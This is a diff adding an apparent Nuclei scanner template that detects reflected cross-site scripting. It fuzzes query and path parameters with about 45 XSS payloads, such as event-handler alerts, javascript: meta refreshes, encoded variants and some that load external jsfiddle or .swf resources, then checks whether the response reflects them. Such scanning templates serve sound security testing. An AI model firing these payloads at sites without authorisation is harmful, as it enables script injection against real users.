@@ -1,0 +1,104 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<style>@keyframes x{}</style><audio style=\"animation-name:x\" onanimationstart=\"alert(1)\"></audio"
+        - "<style>@keyframes x{}</style><dialog style=\"animation-name:x\" onanimationend=\"alert(1)\"></dialog"
+        - "<style>:target {color:red;}</style><time id=x style=\"transition:color 10s\" ontransitionrun=alert(1)></time>"
+        - "<p draggable=\"true\" ondragstart=\"alert(1)\">test</p>"
+        - "<canvas onclick=\"alert(1)\">test</canvas>"
+        - "<script>alert(1)</script>"
+        - "<p onpaste=\"alert(1)\" contenteditable>test</p>"
+        - "<style>@keyframes slidein {}</style><map style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></map>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>"
+        - "<frame src=\"javascript:alert(1)\"></frame>
+"
+        - "<style>:target {color:red;}</style><section id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></section>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click"
+        - "<meta content=javascript:alert(1)>"
+        - "<style>:target {color: red;}</style><select id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></select>"
+        - "</div>&lt;/a&gt;&gt;"
+        - "<style>:target {color:red;}</style><input id=x style=\"transition:color 10s\" ontransitionend=alert(1)>"
+        - "</iframe/src=alert(1)></svg>"
+        - "<style>@keyframes x{}</style><select style=\"animation-name:x\" onanimationstart=alert(1)></select>"
+        - "<frameset draggable=\"true\" ondragenter=\"alert(1)\">"
+        - "<frameset id=x></frameset><style>:target {color: red;}</style><img id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)>"
+        - "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT:alert(1)\" http-equiv=\"refresh\" />"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&#58;&#58;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click"
+        - "</iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">
+<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \">"
+        - "<style>:target {transform: rotate(180deg);}</style><output id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></output>"
+        - "<script>alert(\"XSS\")</script>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><time id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></time>"
+        - "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>"
+        - "<track onbeforecopy=\"alert(1)\" contenteditable>test</track>"
+        - "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script"
+        - "<iframe src='http://jsfiddle.net/XLE63/'>"
+        - "<iframe src=\"data:text/html,&lt;SCRIPT&gt;alert(&#34;XSS&#39;&gt;&#40;&#105;&#119;&#116;&#114;&#99;&#113;&#115;&#112;&#111;&#110;&#114;&#109;&#98;&#97;&#108;&#107;&#100;&#118;&#121;&#122;&#120;&#104;&#111;&#116;&gt;&lt;/SCRIPT&gt;\""
+        - "&lt;/SCRIPT&gt;&lt;/OBJECT&gt;"
+        - "&lt;&lt;&lt;SCRIPT>alert(&#104;&#112;&#116;"
+        - "<style>:target {transform: rotate(180deg);}</style><noscript id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></noscript>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click
+<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>"
+        - "<canvas onbeforecut=\"alert(1)\" contenteditable>test</canvas>"
+        - "<style>@keyframes x{}</style><summary style=\"animation-name:x\" onanimationstart=\"alert(1)\"></summary>"
+        - "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><time id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></time>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click
+<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>"
+        - "<html onbeforepaste=\"alert(1)\" contenteditable>test</html>"
+        - "<style>@keyframes slidein {}</style><object style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></object>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
